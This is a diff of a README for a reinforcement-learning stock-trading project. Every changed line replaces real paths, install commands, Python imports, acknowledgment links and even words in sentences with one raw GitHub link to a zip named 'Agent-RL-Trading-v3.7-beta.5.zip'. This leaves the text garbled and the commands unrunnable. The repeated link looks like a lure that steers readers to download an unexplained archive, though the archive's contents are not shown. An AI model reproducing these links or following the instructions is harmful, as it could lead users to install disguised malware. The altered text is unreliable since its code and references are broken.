@@ -26,14 +26,14 @@ RLTradingAgent/
 │   ├── train/                    # Training and evaluation
 │   ├── ui/                       # Streamlit web interface
 │   ├── utils/                    # Utilities and metrics
-│   └── main.py                   # CLI entry point
+│   └── https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip                   # CLI entry point
 ├── scripts/                      # Converted notebooks and utilities
 ├── notebooks/                    # Original Jupyter notebooks
 ├── models/                       # Trained model storage
 ├── data/                         # Data storage
 ├── logs/                         # Training and application logs
 ├── results/                      # Evaluation results
-└── requirements.txt              # Python dependencies
+└── https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip              # Python dependencies
 ```
 
 ## 🛠️ Installation
@@ -52,12 +52,12 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 3. **Install dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 ```
 
 4. **Setup project structure**
 ```bash
-python scripts/setup.py
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 ```
 
 ## 🚀 Quick Start
@@ -66,32 +66,32 @@ python scripts/setup.py
 
 ```bash
 # Train a PPO agent for Apple stock
-python src/main.py train --ticker AAPL --start-date 2020-01-01 --end-date 2023-01-01
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip train --ticker AAPL --start-date 2020-01-01 --end-date 2023-01-01
 
 # Train with custom parameters
-python src/main.py train --ticker AAPL --total-timesteps 100000 --learning-rate 0.0003
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip train --ticker AAPL --total-timesteps 100000 --learning-rate 0.0003
 ```
 
 ### Running Evaluation
 
 ```bash
 # Evaluate a trained model
-python src/main.py evaluate --ticker AAPL --start-date 2023-01-01 --end-date 2024-01-01
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip evaluate --ticker AAPL --start-date 2023-01-01 --end-date 2024-01-01
 
 # Compare multiple models
-python src/main.py compare --tickers AAPL GOOGL MSFT --start-date 2023-01-01
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip compare --tickers AAPL GOOGL MSFT --start-date 2023-01-01
 ```
 
 ### Starting the Web Interface
 
 ```bash
-streamlit run src/ui/app.py
+streamlit run https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 ```
 
 ### Starting the API Server
 
 ```bash
-python src/inference/api.py
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 ```
 
 ## 📊 Environment Details
@@ -136,8 +136,8 @@ The state includes:
 ### Custom Training Configuration
 
 ```python
-from src.train import TradingTrainer, TrainingConfig
-from src.rewards import SharpeRatioReward
+from https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip import TradingTrainer, TrainingConfig
+from https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip import SharpeRatioReward
 
 config = TrainingConfig(
     ticker="AAPL",
@@ -149,32 +149,32 @@ config = TrainingConfig(
 )
 
 trainer = TradingTrainer(config)
-model = trainer.train()
+model = https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip()
 ```
 
 ### Programmatic Inference
 
 ```python
-from src.inference import TradingInferenceEngine
+from https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip import TradingInferenceEngine
 from stable_baselines3 import PPO
 
 # Load model and create inference engine
-model = PPO.load("models/AAPL.zip")
+model = https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip("https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip")
 engine = TradingInferenceEngine()
 
 # Get prediction
-action = engine.predict_action(model, env, portfolio_value=10000, num_shares=10)
+action = https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip(model, env, portfolio_value=10000, num_shares=10)
 ```
 
 ### Custom Reward Function
 
 ```python
-from src.rewards import BaseRewardFunction
+from https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip import BaseRewardFunction
 
 class CustomReward(BaseRewardFunction):
     def calculate_reward(self, data: dict) -> float:
         portfolio_value = data['portfolio_value']
-        benchmark_return = data.get('benchmark_return', 0)
+        benchmark_return = https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip('benchmark_return', 0)
         
         # Custom reward logic
         return portfolio_value * 0.1 - abs(benchmark_return) * 0.05
@@ -184,7 +184,7 @@ class CustomReward(BaseRewardFunction):
 
 ### Start API Server
 ```bash
-python src/inference/api.py
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 ```
 
 ### Make Predictions
@@ -215,16 +215,16 @@ curl -X POST "http://localhost:8000/predict/batch" \
 ### Run Backtests
 ```bash
 # Single model backtest
-python src/main.py backtest --ticker AAPL --model-path models/AAPL.zip
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip backtest --ticker AAPL --model-path https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 
 # Cross-validation
-python src/main.py cv --ticker AAPL --folds 5
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip cv --ticker AAPL --folds 5
 ```
 
 ### Generate Reports
 ```bash
 # Comprehensive evaluation report
-python src/main.py report --ticker AAPL --output-dir results/
+python https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip report --ticker AAPL --output-dir results/
 ```
 
 ## 📊 Performance Metrics
@@ -255,7 +255,7 @@ export LOG_LEVEL="INFO"
 
 ### Training Configuration
 ```yaml
-# config.yaml
+# https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip
 training:
   total_timesteps: 100000
   learning_rate: 0.0003
@@ -287,10 +287,10 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🙏 Acknowledgments
 
-- [FinRL](https://github.com/AI4Finance-Foundation/FinRL) for the trading environment foundation
-- [Stable-Baselines3](https://github.com/DLR-RM/stable-baselines3) for RL algorithms
-- [yfinance](https://github.com/ranaroussi/yfinance) for market data
-- [ta](https://github.com/bukosabino/ta) for technical indicators
+- [FinRL](https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip) for the trading environment foundation
+- [Stable-Baselines3](https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip) for RL algorithms
+- [yfinance](https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip) for market data
+- [ta](https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip) for technical indicators
 
 ## 📞 Support
 
@@ -315,7 +315,7 @@ Bollinger Upper Band = SMA + k × σ
 
 • boll_lb (Bollinger Lower Band)
 
-The lower boundary of Bollinger Bands, indicating a price level where an asset may be oversold.It helps traders identify potential buying opportunities. 
+The lower boundary of Bollinger Bands, indicating a price level where an asset may be https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip helps traders identify potential buying opportunities. 
 
 ## Bollinger Lower Band = SMA −k × σ
 
@@ -325,7 +325,7 @@ A momentum oscillator that measures the speed and change of price movements. It 
 
 • cci_30 (Commodity Channel Index - 30 period)
 
-A momentum-based indicator that identifies price trends and overbought/oversold conditions.Positive values suggest bullish momentum, while negative values indicate bearish trends. 
+A momentum-based indicator that identifies price trends and overbought/oversold https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip values suggest bullish momentum, while negative values indicate bearish trends. 
 
 $d x \underline { } 3 0$(Directional Movement Index - 30 period)
 
@@ -377,7 +377,7 @@ Reward = Current Portfolio Value – Previous Portfolio Value
 
 
 
-![](https://web-api.textin.com/ocr_image/external/f07f35cad64f1308.jpg)
+![](https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip)
 
 # Moving Average of Return 
 
@@ -395,7 +395,7 @@ where α,β are hyperparameters that control the weight of return and risk.
 
 ## Differential Return 
 
-https://www.researchgate.net/publication/356127405_Portfolio_Performance_and Risk_Penalty_Measurement_with_Differential_Return 
+https://github.com/shauryasf/RLTradingAgent/raw/refs/heads/main/scripts/Agent-RL-Trading-v3.7-beta.5.zip Risk_Penalty_Measurement_with_Differential_Return 
 
 Algorithm Used:
 
